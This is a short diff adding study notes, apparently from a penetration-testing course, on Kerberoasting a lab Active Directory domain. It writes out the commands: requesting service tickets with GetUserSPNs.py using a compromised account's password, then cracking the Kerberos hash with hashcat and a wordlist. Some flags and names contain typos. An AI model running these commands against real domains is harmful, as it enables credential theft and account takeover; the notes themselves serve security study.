@@ -107,3 +107,10 @@ We can use GetUserSPNs.py to use our username and password, point to the domain 
 
 ## Kerberoasting Walkthrough
 
+SPN = Service Principal Name
+Using a compromise account on the DC we can initiate a request using this command
+sudo GetUserSPNS.py MARVEL.local/fcastle:Password -dc-p 192.168.132.136 -request
+
+From result grab krb hash and put it in krb.txt file
+hashcat -m 13100 krb.txt /usr/share/wordlist/rockyou.txt
+
